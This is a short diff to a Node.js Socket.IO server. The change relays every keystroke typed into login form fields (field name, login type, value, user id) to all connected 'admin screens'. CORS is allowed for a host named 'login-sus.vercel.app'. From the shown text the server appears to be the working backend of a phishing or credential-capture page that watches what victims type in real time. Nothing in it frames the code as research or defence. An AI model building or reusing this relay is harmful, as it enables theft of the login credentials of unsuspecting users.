@@ -10,25 +10,27 @@ const server = http.createServer(app);
 
 const io = new Server(server, {
   cors: {
-    origin: "*",
-    methods: ["GET", "POST"]
-  }
+    origin: ["http://localhost:5173", "https://login-sus.vercel.app"],
+    methods: ["GET", "POST"],
+  },
 });
 
 io.on("connection", (socket) => {
-  console.log("A user connected:", socket.id);
+  console.log("User connected:", socket.id);
 
   socket.on("typing", (data) => {
-    console.log("User typed:", data);
-    // send to all admin screens
-    io.emit("showText", data);
+    io.emit("showText", {
+      userId: data.userId || socket.id, // use client id if sent
+      loginType: data.type,
+      field: data.field,
+      value: data.value,
+    });
   });
 
   socket.on("disconnect", () => {
     console.log("User disconnected:", socket.id);
   });
 });
-
 server.listen(5000, () => {
   console.log("Server running on http://localhost:5000");
 });
